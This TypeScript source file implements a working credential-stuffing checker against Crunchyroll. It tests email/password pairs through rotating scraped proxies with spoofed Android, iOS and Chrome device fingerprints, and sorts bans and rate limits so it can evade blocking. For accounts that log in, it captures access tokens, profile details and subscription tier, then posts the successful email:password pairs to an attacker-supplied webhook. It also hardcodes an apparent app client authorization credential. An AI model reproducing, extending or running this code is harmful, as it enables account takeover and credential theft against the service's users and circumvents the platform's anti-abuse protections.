import express from 'express';
import path from 'path';
import { createServer as createViteServer } from 'vite';
import axios from 'axios';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { SocksProxyAgent } from 'socks-proxy-agent';
import crypto from 'crypto';
import { autoProxyRotator } from './server-proxy-manager.js';

// Helper to resolve proxy agents for different protocols
function getProxyAgent(proxyUrl: string | undefined): HttpsProxyAgent<any> | SocksProxyAgent | null {
  if (!proxyUrl) return null;
  try {
    const parsed = new URL(proxyUrl);
    if (parsed.protocol.startsWith('socks')) {
      return new SocksProxyAgent(proxyUrl, { timeout: 15000 });
    } else {
      return new HttpsProxyAgent(proxyUrl, {
        rejectUnauthorized: false,
        timeout: 15000,
        keepAlive: true,
      });
    }
  } catch (err) {
    return null;
  }
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));

  // API 1: Test Proxy Health and Latency
  app.post('/api/test-proxy', async (req, res) => {
    const { host, port, type, username, password } = req.body;
    if (!host || !port) {
      return res.status(400).json({ success: false, error: 'Missing proxy host or port' });
    }

    // Build raw proxy URI
    let authStr = '';
    if (username) {
      authStr = `${encodeURIComponent(username)}:${encodeURIComponent(password || '')}@`;
    }
    const protocol = (type || 'http').toLowerCase();
    const proxyUrl = `${protocol}://${authStr}${host}:${port}`;

    const agent = getProxyAgent(proxyUrl);
    const startTime = Date.now();

    try {
      // Perform a single direct query against the Crunchyroll portal bypassing ipify
      const resCrunchy = await axios.get('https://beta-api.crunchyroll.com/', {
        headers: {
          'User-Agent': 'Crunchyroll/3.74.2 Android/13 okhttp/4.10.0',
        },
        httpAgent: agent || undefined,
        httpsAgent: agent || undefined,
        proxy: false,
        timeout: 6000,
        validateStatus: () => true, // Continue even on 4xx/5xx status codes
      });

      const latency = Date.now() - startTime;

      let crunchyStatus = 'allowed';
      let crunchyError = '';

      if (resCrunchy.status === 403) {
        crunchyStatus = '403_blocked';
        crunchyError = 'Cloudflare Threat IP (403)';
      } else if (resCrunchy.status === 429) {
        crunchyStatus = '429_rate_limited';
        crunchyError = 'IP Rate Limited (429)';
      }

      return res.json({
        success: true,
        status: 'alive',
        ping: latency,
        crunchyStatus,
        crunchyError,
        ip: host,
      });

    } catch (err: any) {
      return res.json({
        success: false,
        status: 'dead',
        error: err.message || 'Connection timeout / Offline endpoint',
      });
    }
  });

  // API 3: Server-side Proxy Scraper
  app.get('/api/scrape-proxies', async (req, res) => {
    try {
      const fetchProxiesForProto = async (protocol: string) => {
        try {
          const url = `https://api.proxyscrape.com/v2/?request=displayproxies&protocol=${protocol}&timeout=8000&country=all&ssl=all&anonymity=elite,anonymous`;
          const response = await axios.get(url, { timeout: 15000 });
          return response.data || '';
        } catch {
          return '';
        }
      };

      const [httpText, socks4Text, socks5Text] = await Promise.all([
        fetchProxiesForProto('http'),
        fetchProxiesForProto('socks4'),
        fetchProxiesForProto('socks5'),
      ]);

      return res.json({
        success: true,
        http: httpText || '',
        socks4: socks4Text || '',
        socks5: socks5Text || '',
      });
    } catch (err: any) {
      return res.status(500).json({ success: false, error: err.message });
    }
  });

  // API: Get Server-Side Auto Proxy Pool Status
  app.get('/api/internal-proxies-status', (req, res) => {
    return res.json({
      success: true,
      stats: autoProxyRotator.getStatusSnapshot(),
    });
  });

  // API 2: Verify account credentials directly on Crunchyroll
  app.post('/api/check-account', async (req, res) => {
    const { email, pass, proxy, timeout = 5000, userAgentType, customHeaders, config: requestedConfig } = req.body;

    if (!email || !pass) {
      return res.status(400).json({ error: 'Missing email or password' });
    }

    let activeProxy = proxy;
    let usingInternalAuto = false;

    if (!activeProxy || activeProxy === 'auto' || activeProxy === 'internal' || activeProxy === 'Server Auto-Rotate' || activeProxy === 'Server-Side Rotator' || activeProxy === 'Server-Side Auto-Proxy') {
      const rotated = autoProxyRotator.getRandomProxy();
      if (rotated) {
        activeProxy = rotated;
        usingInternalAuto = true;
      }
    }

    const agent = activeProxy ? getProxyAgent(activeProxy) : null;
    const startTime = Date.now();

    // Spectral Identity Matrix: Deep fingerprinting for socket stealth
    const getDeviceContext = (type: string) => {
      const androidVers = ['11', '12', '13', '14'];
      const iosVers = ['15.0', '16.0', '17.0'];
      const vIdx = Math.floor(Math.random() * 3);
      
      if (type === 'Mobile Android') {
        const ver = androidVers[vIdx];
        return {
          ua: `Crunchyroll/3.74.2 Android/${ver} okhttp/4.10.0`,
          name: 'Pixel ' + (6 + vIdx),
          type: 'Google Pixel ' + (6 + vIdx),
          headers: {
            'Accept-Encoding': 'gzip, deflate',
            'X-Crunchyroll-App-Version': '3.74.2',
            'X-Crunchyroll-Platform': 'android',
          }
        };
      }
      if (type === 'Mobile iOS') {
        const ver = iosVers[vIdx];
        return {
          ua: `Crunchyroll/4.44.0 iOS/${ver} okhttp/4.10.0`,
          name: 'iPhone ' + (13 + vIdx),
          type: 'Apple iPhone' + (14 + vIdx) + ',' + (vIdx + 1),
          headers: {
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Crunchyroll-App-Version': '4.44.0',
            'X-Crunchyroll-Platform': 'ios',
          }
        };
      }
      return null;
    };

    const ctx = getDeviceContext(userAgentType);
    let userAgent = ctx?.ua || 'Crunchyroll/3.74.2 Android/13 okhttp/4.10.0';
    let deviceName = ctx?.name || 'sdk_gphone64_x86_64';
    let deviceType = ctx?.type || 'Google sdk_gphone64_x86_64';
    let platformHeaders = ctx?.headers || {};

    if (userAgentType === 'Web Chrome') {
      userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
      platformHeaders = {
        'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
      };
    } 

    // Prepare robust basic authorization headers with behavioral entropy
    const baseHeaders: Record<string, string> = {
      'User-Agent': userAgent,
      'Accept': 'application/json, text/plain, */*',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Authorization': 'Basic ZG1yeWZlc2NkYm90dWJldW56NXo6NU45aThPV2cyVmtNcm1oekNfNUNXekRLOG55SXo0QU0=',
      'Connection': 'keep-alive',
      'etp-anonymous-id': crypto.randomUUID(),
      ...platformHeaders
    };

    // Inject user custom headers
    if (Array.isArray(customHeaders)) {
      customHeaders.forEach((h: any) => {
        if (h && typeof h.key === 'string' && typeof h.value === 'string' && h.key && h.value) {
          baseHeaders[h.key] = h.value;
        }
      });
    }

    // Hardware Spoofing System: Generate semi-persistent device fingerprints
    let deviceId = crypto.randomUUID();
    if (requestedConfig?.hardwareSpoofing) {
        // Create a unique hash reflecting the combination of account and a randomized seed
        const hardwareSeed = crypto.createHash('md5').update(`${email}:${Math.floor(Date.now() / 86400000)}`).digest('hex');
        deviceId = `cp-${hardwareSeed.substring(0, 8)}-${hardwareSeed.substring(8, 12)}-${hardwareSeed.substring(12, 16)}-${hardwareSeed.substring(16, 20)}-${hardwareSeed.substring(20, 32)}`;
    }

    const bodyData = new URLSearchParams({
      grant_type: 'password',
      username: email,
      password: pass,
      about: 'offline_access',
      device_id: deviceId,
      device_name: deviceName,
      device_type: deviceType,
    }).toString();

    // Heuristic Classification Registry (Socket-Level Intelligence)
    const classifyError = (error: any) => {
        if (!error.response) {
            const code = error.code;
            if (code === 'ECONNRESET') return { message: 'Banned Socket (ECONNRESET): Remote server cut the pipe', type: 'ban' };
            if (code === 'ECONNREFUSED') return { message: 'Connection Refused: Target port unresponsive', type: 'dead' };
            if (code === 'ETIMEDOUT') return { message: 'Socket Timeout: Proxy bottleneck or dead node', type: 'dead' };
            if (code === 'EPIPE') return { message: 'Broken Pipe (EPIPE): Premature stream closure', type: 'ban' };
            if (code === 'EHOSTUNREACH') return { message: 'Host Unreachable: Network routing failure', type: 'dead' };
            
            return { message: error.message || 'Unknown Network Disruption', type: 'network' };
        }
        
        const status = error.response.status;
        const body = error.response.data || {};
        const code = body.code || '';
        const msg = body.message || '';

        if (status === 403 && (msg.includes('blocked') || msg.includes('access denied'))) return { message: 'Blacklisted: IP/Device Fingerprint Flagged', type: 'ban' };
        if (status === 429) return { message: 'Rate Limited: Excessive throughput detected', type: 'ban' };
        if (code === 'invalid_credentials') return { message: 'Invalid Credentials', type: 'invalid' };
        if (code === 'invalid_grant') return { message: 'Account Terminated or Suspended', type: 'invalid' };
        
        return { message: `API Error: ${status} [${code}] ${msg}`, type: 'error' };
    };

    try {
      const authResponse = await axios.post('https://www.crunchyroll.com/auth/v1/token', bodyData, {
        headers: baseHeaders,
        httpAgent: agent || undefined,
        httpsAgent: agent || undefined,
        proxy: false, // Must be false when using HttpsProxyAgent
        timeout,
      });

      console.log(`[AUTH API Response] Status: ${authResponse.status} Email: ${email}`);
      
      if (authResponse.status === 200 && authResponse.data.access_token) {
        const tokenData = authResponse.data;
        const accessToken = tokenData.access_token;
        const authHeaders = {
          'Authorization': `Bearer ${accessToken}`,
          'User-Agent': baseHeaders['User-Agent'],
        };

        // Retrieve customer profile information (to get external_id)
        const profileResponse = await axios.get('https://www.crunchyroll.com/accounts/v1/me', {
          headers: authHeaders,
          httpAgent: agent || undefined,
          httpsAgent: agent || undefined,
          proxy: false, // Must be false when using HttpsProxyAgent
          timeout,
        });

        const profileData = profileResponse.data;
        const externalId = profileData.external_id;

        // Retrieve multiprofile info
        let profilesCount = 1;
        let country = 'unknown';
        let accountId = 'unknown';
        let profileName = 'unknown';
        try {
          const multiReq = await axios.get('https://www.crunchyroll.com/accounts/v1/me/multiprofile', {
            headers: authHeaders,
            httpAgent: agent || undefined,
            httpsAgent: agent || undefined,
            proxy: false,
            timeout,
          });
          const mData = multiReq.data;
          profilesCount = Array.isArray(mData.profiles) ? mData.profiles.length : 1;
          if (mData.profiles && mData.profiles.length > 0) {
            const extendedRatings = mData.profiles[0].extended_maturity_rating || {};
            country = Object.keys(extendedRatings)[0] || 'unknown';
            accountId = mData.profiles[0].profile_id || 'unknown';
            profileName = mData.profiles[0].username || 'unknown';
          }
        } catch (e: any) {
           console.log(`[MultiProfile error] ${e.message}`);
        }

        // Subscriptions check
        let isPremium = false;
        let tier = 'Free';
        if (externalId) {
           try {
             const subReq = await axios.get(`https://www.crunchyroll.com/subs/v1/subscriptions/${externalId}/benefits`, {
                headers: authHeaders,
                httpAgent: agent || undefined,
                httpsAgent: agent || undefined,
                proxy: false,
                timeout,
             });
             const sData = subReq.data;
             if (sData && sData.items && sData.total > 0) {
                const items = sData.items || [];
                const benefits = items.map((item: any) => item.benefit);
                if (benefits.includes('cr_mega_pack')) { tier = 'Mega Pack'; isPremium = true; }
                else if (benefits.includes('cr_premium')) { tier = 'Premium'; isPremium = true; }
                else if (benefits.includes('cr_fan_pack')) { tier = 'Fan Pack'; isPremium = true; }
                else { tier = 'Premium (Unknown)'; isPremium = true; }
             }
           } catch(e: any) {
              if (e.response && e.response.status === 404) {
                 tier = 'Free';
              } else {
                 console.log(`[Subscription Error] ${e.message}`);
                 tier = 'Free/Unknown';
              }
           }
        }

        if (usingInternalAuto && activeProxy) {
          autoProxyRotator.registerFeedback(activeProxy, 'success');
        }

        const finalResult = {
          success: true,
          status: isPremium ? 'hit_premium' : 'free',
          tier,
          country,
          paymentMethod: 'N/A', 
          profiles: profilesCount,
          nextBilling: 'N/A',
          expiry: 'N/A',
          checkedByProxy: activeProxy || 'Direct Egress',
          realConnection: true,
          capture: {
            accessToken,
            externalId,
            accountId,
            profileName,
          }
        };

        // Automated Webhook Sync Engine
        if (isPremium && requestedConfig.webhookUrl) {
            try {
              axios.post(requestedConfig.webhookUrl, {
                content: `🚀 **New Crunchyroll Hit!**\n**User:** ${email}:${pass}\n**Tier:** ${tier}\n**Country:** ${country}\n**Proxy:** ${activeProxy || 'Direct'}`
              }).catch(() => {}); // Fire and forget
            } catch(e) {}
        }

        return res.json(finalResult);
      } else {
        if (usingInternalAuto && activeProxy) {
          autoProxyRotator.registerFeedback(activeProxy, 'success');
        }

        return res.json({
          success: true,
          status: 'invalid',
          checkedByProxy: activeProxy || 'Direct Egress',
          realConnection: true,
        });
      }
    } catch (err: any) {
      if (usingInternalAuto && activeProxy) {
        if (err.response && (err.response.status === 403 || err.response.status === 429)) {
          autoProxyRotator.registerFeedback(activeProxy, 'rate-limit');
        } else {
          autoProxyRotator.registerFeedback(activeProxy, 'failure');
        }
      }

      const classification = classifyError(err);

      // Map heuristic classification to business logic
      if (classification.type === 'invalid') {
          return res.json({
            success: true,
            status: 'invalid',
            checkedByProxy: activeProxy || 'Direct Egress',
            realConnection: true,
          });
      }

      return res.json({
        success: false,
        error: classification.message,
        status: 'error',
        errorMessage: classification.message,
        checkedByProxy: activeProxy || 'Direct Egress',
      });
    }
  });

  // Vite integration for asset serving
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
